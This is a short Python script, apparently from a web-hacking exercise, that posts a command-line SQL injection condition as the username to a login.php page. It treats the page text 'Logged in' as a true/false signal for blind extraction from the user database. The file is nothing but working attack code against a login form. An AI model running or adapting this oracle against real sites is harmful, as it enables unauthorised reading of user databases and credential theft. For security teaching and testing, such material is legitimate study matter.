# @author Melinda Sherrill
# Goes to website and sends payload to login.php to exploit the user database
import requests
import sys

BASEURL = "http://frechetta.me/WebHack/php/login.php"  # Input the URL running the .php file that connects to db

SESSION = requests.Session()

TRUE = "Logged in" # go to link above to see this is on the page

# Get's the url and session data
def postURL(url, data):
	return SESSION.post(format(url), data).text

# Sends payload injection to sql query in login.php
def evaluateSQL(cond):
	payload = cond  
	response = postURL(BASEURL, {"username" : payload})

	#print response
	return TRUE in response
	
print evaluateSQL(sys.argv[1])

